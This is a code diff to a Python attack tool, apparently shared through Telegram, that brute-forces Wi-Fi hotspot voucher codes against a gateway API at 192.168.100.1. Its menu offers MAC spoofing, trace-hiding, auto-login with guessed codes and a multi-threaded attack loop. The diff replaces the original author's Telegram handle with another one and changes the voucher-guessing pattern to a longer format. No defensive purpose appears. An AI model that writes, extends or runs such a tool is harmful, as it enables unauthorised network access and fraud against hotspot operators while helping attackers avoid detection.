@@ -16,8 +16,8 @@ class LOD_V32_FIXED:
         self.dev_id = f"DEV-LOD-{uuid.uuid4().hex[:10].upper()}"
         self.is_running = False
         self.target_url = "http://192.168.100.1/api/v1/voucher"
-        self.tg_owner = "@thet_paing_zaw_2001"
-        self.tg_channel = "https://t.me/+rUbkkAwaEc8zOTI1"
+        self.tg_owner = "@guts9984"
+        self.tg_channel = "https://t.me/+guts9984"
 
     def clean_screen(self):
         sys.stdout.write("\\033[H\\033[2J")
@@ -72,7 +72,7 @@ class LOD_V32_FIXED:
         print(f" [{self.G}1{self.W}] Turbo Network Penetration Engine")
         print(f" [{self.G}2{self.W}] Voucher Code အလိုအလျောက် ပတ်စစ်ရန် (LOD Nitro)")
         print(f" [{self.G}3{self.W}] မိထားသော Code များ ပြန်ကြည့်ရန်")
-        print(f" [{self.G}4{self.W}] Code မိပါက အလိုအလျောက် Login ဝင်ရန်")
+        print(f" [{self.G}4{self.W}] Code auto login")
         print(f" [{self.G}5{self.W}] ဖုန်း ID အသစ်ပြောင်းရန် (MAC Spoof)")
         print(f" [{self.G}6{self.W}] Privacy Mode ဖွင့်ရန် (ခြေရာဖျောက်ခြင်း)")
         print(f" [{self.G}7{self.W}] Multi-Thread Active Attack (မရမချင်း ပတ်စစ်ရန်)")
@@ -119,7 +119,10 @@ class LOD_V32_FIXED:
         self.is_running = True
         try:
             while self.is_running:
-                code = "".join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ23456789", k=8))
+                part1 = "".join(random.choices("0123456789", k=6))
+                part2 = "".join(random.choices("0123456789", k=9))
+                part3 = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=6))
+                code = part1 + part2 + part3
                 sys.stdout.write(f"\\r [{self.G}*{self.W}] Testing: {self.Y}{code}{self.W} | Status: {self.R}Striking Engine...")
                 sys.stdout.flush()
                 try:
